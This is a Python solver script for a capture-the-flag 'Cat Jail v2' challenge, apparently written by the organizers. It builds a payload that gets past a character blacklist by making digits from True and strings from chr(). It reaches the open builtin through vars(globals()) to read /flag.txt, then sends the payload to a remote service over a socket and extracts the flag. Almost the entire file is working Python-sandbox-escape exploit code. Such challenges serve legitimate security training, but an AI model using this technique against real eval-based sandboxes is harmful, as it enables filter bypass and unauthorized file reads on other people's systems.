#!/usr/bin/env python3
"""
Cat Jail v2 - solver (organizers only, do NOT ship to players).

Banned: quotes, dots, underscores, digits, non-ASCII, and the v1 words (+ "read").
Idea: numbers from True, characters from chr(), builtins reached through
globals()/vars() dictionaries, file read by unpacking it into a list.

Usage:
    python3 solve.py [host] [port]      # default localhost 1338
    python3 solve.py --print            # only print the payload
"""
import re
import socket
import sys


def num(n: int) -> str:
    """n written as a sum of (t<<k), where t is True and k is a sum of t's."""
    parts = []
    for k in range(8):
        if n >> k & 1:
            parts.append("t" if k == 0 else "(t<<" + "+".join(["t"] * k) + ")")
    return "+".join(parts)


def string(text: str) -> str:
    return "+".join(f"chr({num(ord(c))})" for c in text)


def payload() -> str:
    builtins = f"vars(globals()[{string('__builtins__')}])"
    opener = f"{builtins}[{string('open')}]"
    return f"[(t:=True),[*{opener}({string('/flag.txt')})]][t]"


if __name__ == "__main__":
    p = payload()
    if "--print" in sys.argv:
        print(p)
        print(f"# {len(p)} characters", file=sys.stderr)
        sys.exit()

    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1338
    with socket.create_connection((host, port), timeout=10) as s:
        data = b""
        while b">>> " not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        s.sendall(p.encode() + b"\n")
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk

    text = data.decode(errors="replace")
    m = re.search(r"SecurinetsENIT\{[^}]*\}", text)
    print(m.group(0) if m else text)
